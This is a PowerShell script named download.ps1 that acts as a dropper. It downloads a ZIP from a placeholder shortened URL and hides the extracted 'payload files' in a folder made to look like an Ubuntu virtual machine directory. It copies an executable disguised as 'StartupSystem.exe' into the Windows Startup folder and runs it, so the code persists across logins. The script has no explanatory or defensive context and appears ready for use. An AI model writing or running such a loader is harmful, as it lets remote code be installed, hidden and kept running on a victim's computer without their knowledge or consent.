# download.ps1

# Variables
$D = $env:TEMP
$zipUrl = "https://bit.ly/your-zip"
$zipFile = "$D\js7.zip"
$destDir = "$env:USERPROFILE\Documents\Virtual Machines\Ubuntu24\"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\StartupSystem.exe"

# Step 1: Download the ZIP file
Invoke-RestMethod $zipUrl -O $zipFile

# Step 2: Extract the ZIP file
Expand-Archive $zipFile -DestinationPath $D -Force

# Step 3: Create the target directory if it doesn't exist
if (-not (Test-Path $destDir)) {
    New-Item -Path $destDir -ItemType Directory -Force
}

# Step 4: Move payload files to the target directory
Move-Item "$D\js7\ALT.WAV" -Destination $destDir -Force
Move-Item "$D\js7\WIN.WAV" -Destination $destDir -Force
Move-Item "$D\js7\ubuntu24.ps1" -Destination $destDir -Force
Move-Item "$D\js7\ubuntu25.ps1" -Destination $destDir -Force
Move-Item "$D\js7\reinstate.ps1" -Destination $destDir -Force
Move-Item "$D\js7\resound.ps1" -Destination $destDir -Force
Move-Item "$D\js7\SoundVolumeView.exe" -Destination $destDir -Force

# Step 5: Move the executable to the Startup folder
Move-Item "$D\js7\StartupSystem.exe" -Destination $startupPath -Force

# Step 6: Run the startup executable
Start-Process $startupPath
